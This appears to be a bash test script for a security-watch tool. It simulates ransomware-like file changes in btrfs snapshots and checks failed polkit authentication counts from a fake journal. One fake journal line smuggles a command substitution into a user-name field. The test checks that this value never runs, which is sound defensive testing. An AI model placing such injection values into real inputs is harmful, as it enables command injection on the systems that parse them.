printf '#!/usr/bin/bash\n[[ "$1" == receive ]] && cat "%s/dump"\nexit 0\n' "${T}" >"${T}/btrfs"
chmod 0755 "${T}/btrfs"
S="${R}/var/home/.snapshots"
mkdir -p "${S}/2026-10-10_1200/alice/Docs"
timeout 120 "${WATCH}" >/dev/null || fail "the first run reading snapshots failed"
mkdir -p "${S}/2026-10-10_1300/alice/Docs"
{
    echo 'snapshot        ./2026-10-10_1300               uuid=1 transid=10 parent_uuid=2 parent_transid=9'
    for i in $(seq 1 320); do
        head -c 5000 < <(yes "plain text line ${i}") >"${S}/2026-10-10_1200/alice/Docs/note ${i}.txt"
        head -c 5000 /dev/urandom >"${S}/2026-10-10_1300/alice/Docs/note ${i}.txt"
        echo "update_extent   ./2026-10-10_1300/alice/Docs/note\\ ${i}.txt offset=0 len=5000"
    done
    for i in $(seq 1 20); do echo "update_extent   ./2026-10-10_1300/bob/b${i} offset=0 len=1"; done
    for i in $(seq 1 400); do echo "update_extent   ./2026-10-10_1300/bob/.cache/c${i} offset=0 len=1"; done
    for i in $(seq 1 350); do echo "unlink          ./2026-10-10_1300/mallory/Pictures/p${i}"; done
    echo 'mkfile          ./2026-10-10_1300/o269-10-0'
    echo 'rename          ./2026-10-10_1300/o269-10-0     dest=./2026-10-10_1300/alice/Docs/new\ file'
} >"${T}/dump"
before="$(wc -l <"${HISTORY}")"
timeout 300 "${WATCH}" >/dev/null || fail "the run reading snapshots failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "snapshot-watch")')"
jq -se 'length == 2
    and any(.[]; .level == "critical" and .account == "alice" and .at == "2026-10-10_1200" and .tactic == "Impact"
        and (.text | startswith("320 files in alice'"'"'s home folder changed within the hour before 2026-10-10_1300, and 100 of the 100 looked at went from readable to random")))
    and any(.[]; .level == "critical" and .account == "mallory" and (.text | startswith("350 files were deleted from mallory")))' \
    <<<"${FOUND}" >/dev/null || fail "ransomware behaviour: ${FOUND}"

# --- Polkit's questions in the journal ----------------------------------------------------------------------

# A Vault question given up after a wrong password counts against that account, three of them make a finding; a Cancel does not
# count, and a line anyone can write with a command for a name runs nothing (the name is read only as a plain one)
cat >"${AMETHYSTORA_SECURITY_CONF}" <<'EOF2'
AUDIT_LOG=off
HARDENING=off
JOURNAL=on
LISTENERS=off
IMAGE_DRIFT=off
SETUID_SWEEP=off
REPORT_ALERTS=off
USER_PATHS=off
NETWORK=off
EOF2
mkdir -p "${T}/bin"
cat >"${T}/bin/journalctl" <<EOF2
#!/usr/bin/bash
for arg in "\$@"; do [[ "\${arg}" == --cursor-file=* ]] && echo here >"\${arg#--cursor-file=}"; done
[[ " \$* " == *" -n1 "* ]] && exit 0
cat "${T}/journal"
EOF2
chmod 0755 "${T}/bin/journalctl"
FAILED='polkitd[6633]: Operator of unix-process:7:8 FAILED to authenticate to gain authorization for action org.amethystora.vault.use for unix-process:7:8 [<unknown>]'
{
    for minute in 10 20 30; do
        echo "2026-11-09T11:${minute}:01-05:00 host polkit-agent-helper-1[9]: pam_unix(polkit-1:auth): authentication failure; logname=alice uid=4500 euid=0 tty= ruser=alice rhost=  user=alice"
        echo "2026-11-09T11:${minute}:40-05:00 host ${FAILED} (owned by unix-user:alice)"
    done
    echo "2026-11-09T11:40:00-05:00 host ${FAILED} (owned by unix-user:bob)"
    echo "2026-11-09T11:50:00-05:00 host polkit-agent-helper-1[9]: pam_unix(polkit-1:auth): authentication failure; logname=x uid=1 euid=0 tty= ruser=x rhost=  user=\$(touch ${T}/ran)"
    echo "2026-11-09T11:50:01-05:00 host ${FAILED} (owned by unix-user:\$(touch ${T}/ran))"
} >"${T}/journal"
rm -f "${R}/var/lib/amethystora/security/journal.cursor"
PATH="${T}/bin:${PATH}" timeout 120 "${WATCH}" >/dev/null || fail "the run that only marks the journal failed"
before="$(wc -l <"${HISTORY}")"
PATH="${T}/bin:${PATH}" timeout 120 "${WATCH}" >/dev/null || fail "the run reading the journal failed"
FOUND="$(tail -n +"$((before + 1))" "${HISTORY}" | jq -c 'select(.key == "journal")')"
jq -se 'length == 1 and .[0].account == "alice" and .[0].level == "normal" and (.[0].text | startswith("3 Amethystora Vault question"))' \
    <<<"${FOUND}" >/dev/null || fail "the Vault's questions given up after a wrong password: ${FOUND}"
[[ -e "${T}/ran" ]] && fail "a name read from the journal ran a command"

echo "test-security-watch: what an account plants is only ever read"
